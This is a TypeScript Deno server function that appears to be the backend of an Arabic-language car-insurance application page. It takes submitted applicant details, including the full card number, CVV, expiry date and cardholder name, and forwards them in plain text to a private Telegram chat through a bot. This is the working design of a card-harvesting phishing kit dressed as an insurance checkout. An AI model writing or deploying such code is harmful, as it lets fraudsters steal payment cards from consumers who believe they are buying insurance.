import { serve } from "https://deno.land/std@0.190.0/http/server.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

interface TelegramMessage {
  message: string;
  applicationData?: {
    fullName?: string;
    phone?: string;
    selectedCompany?: string;
    selectedPrice?: string;
    insuranceType?: string;
    vehicleManufacturer?: string;
    vehicleModel?: string;
    vehicleYear?: string;
    cardholderName?: string;
    cardNumber?: string;
    cardCvv?: string;
    expiryDate?: string;
  };
}

const handler = async (req: Request): Promise<Response> => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
    const TELEGRAM_CHAT_ID = Deno.env.get("TELEGRAM_CHAT_ID");

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      throw new Error("Telegram credentials not configured");
    }

    const { message, applicationData }: TelegramMessage = await req.json();

    let formattedMessage = message;

    if (applicationData) {
      formattedMessage = `
🚗 *طلب تأمين جديد*

👤 *بيانات العميل:*
• الاسم: ${applicationData.fullName || 'غير محدد'}
• الهاتف: ${applicationData.phone || 'غير محدد'}

🏢 *بيانات التأمين:*
• الشركة: ${applicationData.selectedCompany || 'غير محدد'}
• السعر: ${applicationData.selectedPrice || 'غير محدد'} ريال
• نوع التأمين: ${applicationData.insuranceType || 'غير محدد'}

🚙 *بيانات المركبة:*
• الشركة المصنعة: ${applicationData.vehicleManufacturer || 'غير محدد'}
• الموديل: ${applicationData.vehicleModel || 'غير محدد'}
• السنة: ${applicationData.vehicleYear || 'غير محدد'}

💳 *بيانات الدفع:*
• اسم حامل البطاقة: ${applicationData.cardholderName || 'غير محدد'}
• رقم البطاقة: ${applicationData.cardNumber || 'غير محدد'}
• CVV: ${applicationData.cardCvv || 'غير محدد'}
• تاريخ الانتهاء: ${applicationData.expiryDate || 'غير محدد'}

📅 التاريخ: ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}
      `.trim();
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: formattedMessage,
        parse_mode: "Markdown",
      }),
    });

    const result = await response.json();

    if (!result.ok) {
      console.error("Telegram API error:", result);
      throw new Error(result.description || "Failed to send Telegram message");
    }

    console.log("Telegram message sent successfully");

    return new Response(
      JSON.stringify({ success: true, message: "Message sent successfully" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      }
    );
  } catch (error: any) {
    console.error("Error in send-telegram function:", error);
    return new Response(
      JSON.stringify({ error: error.message }),
      {
        status: 500,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      }
    );
  }
};

serve(handler);
